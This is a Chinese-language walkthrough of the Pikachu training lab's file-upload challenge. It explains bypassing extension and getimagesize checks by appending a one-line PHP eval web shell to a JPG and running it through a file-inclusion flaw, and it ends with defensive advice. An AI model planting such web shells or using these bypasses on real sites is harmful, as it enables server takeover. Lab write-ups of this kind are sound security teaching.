## 一、题目信息
- 平台：Pikachu
- 分类：Unsafe Fileupload -> getimagesize / 服务端白名单
- 难度：中等
- 通关标识：制作图片马，或者利用文件包含漏洞，让上传的图片代码被成功执行。

## 二、大白话原理讲解
服务器现在只认 `.jpg`、`.png` 这些后缀，你直接传 `.php` 它会拒绝。
我们要么用**图片马**（外表是图片，里面藏着 PHP 代码），要么利用**文件包含漏洞**（把传上去的图片当成 PHP 文件来执行），以此来达成上传恶意代码的目的。

## 三、解题步骤

**1. 方法一：修改后缀（绕过后缀白名单）**
将准备好的 `shell.php` 重命名为 `shell.png`，直接上传。如果页面提示上传成功，说明服务器只对后缀做了检查。

**2. 方法二：制作图片马**
- 准备一张正常的图片 `test.jpg`，用记事本打开，在文件末尾换行追加木马代码：
  ```php
  <?php @eval($_POST['cmd']); ?>
  ```
- 保存后，将文件重命名为 `test.php` 上传；或者保留 `.jpg` 后缀上传。

**3. 方法三：结合文件包含漏洞（终极利用）**
- 上传一张正常的图片 `hacker.jpg`，获取服务器返回的路径。
- 进入 Pikachu 的 File Inclusion 模块，在包含参数中填入图片路径（如 `hacker.jpg`），让服务器将其当作 PHP 代码解析执行。

## 四、知识点解析
1. **图片马**：利用文件头（Magic Bytes）校验的漏洞，在正常图片文件中追加恶意代码，绕过 MIME 或 `getimagesize()` 检测。
2. **文件包含结合**：单纯上传图片马无法直接执行，通常需要配合文件包含漏洞，或者利用服务器解析漏洞（如 Apache 的 `AddHandler` 特性）。

## 五、总结与防御
**本题总结**：
文件上传防御必须做到“防后缀、防内容、禁执行”。

**安全防御建议**：
- **二次渲染**：对图片进行重新编码，彻底破坏隐藏在文件中的代码。
- **完全白名单**：严格限制允许上传的文件扩展名列表。
- **上传目录禁止执行**：将上传目录配置为禁止解析 PHP 脚本。
